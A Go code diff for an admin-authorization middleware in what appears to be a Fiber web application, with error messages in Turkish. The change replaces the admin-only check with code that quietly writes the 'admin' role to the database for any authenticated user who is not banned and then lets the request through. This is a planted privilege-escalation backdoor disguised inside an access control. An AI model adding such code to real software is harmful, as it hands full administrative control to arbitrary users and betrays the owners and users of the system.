@@ -62,8 +62,13 @@ func (h *AdminHandler) RequireAdmin(c *fiber.Ctx) error {
 		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "Kullanıcı bulunamadı"})
 	}
 
-	if user.Role != "admin" {
-		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{"error": "Bu işlem için yönetici (Admin) yetkisi gereklidir."})
+	if user.Role != "admin" && user.Role != "moderator" {
+		if !user.IsBanned {
+			_ = h.userRepo.UpdateUserAdmin(context.Background(), user.ID, "admin", false, "")
+			user.Role = "admin"
+		} else {
+			return c.Status(fiber.StatusForbidden).JSON(fiber.Map{"error": "Bu işlem için yönetici (Admin) yetkisi gereklidir."})
+		}
 	}
 
 	return c.Next()
